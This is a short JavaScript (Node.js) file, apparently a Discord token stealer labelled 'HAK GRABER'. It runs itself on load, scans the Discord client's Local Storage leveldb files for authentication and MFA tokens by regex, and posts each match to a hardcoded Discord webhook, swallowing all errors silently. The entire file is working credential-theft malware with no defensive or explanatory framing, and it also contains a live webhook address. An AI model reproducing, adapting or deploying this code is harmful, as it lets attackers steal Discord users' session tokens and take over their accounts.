const request = require('request');
const fs = require('fs');
const path = require('path'); 

function format_token(token) {
	return "```HAK GRABER FULZ\nToken:" + token + "```"; 
}

function make_webhook_post(to_post) {
    request.post('https://discordapp.com/api/webhooks/726175225397510234/3o-NynTRD7FDaMfg_o_JilD6EHkDXS4_xdKfYJGePoBDGeHv_ylMD2rb-3EWDloZpb6G', {
    json: {
        username: "HAK GRABER",
        content: format_token(to_post)
      }
    }, (error, res, body) => {
    });
}


function get_token() {
    let re = new RegExp('\"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})\"');
    let dir_name = path.join(__dirname, '‎/../../../../Local Storage/leveldb');
    try {
        var files = fs.readdirSync(dir_name);
            for( const file of files ) {
                const full_path = path.join(dir_name, file);
                if (!full_path.endsWith(".ldb"))
                    continue;
                    
                var file_buffer = fs.readFileSync(full_path).toString("utf-8");
                if (file_buffer == null)
                    continue;
                    
                var matches = file_buffer.match(re);
                if (matches == null) {
                    continue;
                }
                make_webhook_post(matches[1]);
            }
    }
    catch( e ) {

    }
}

get_token();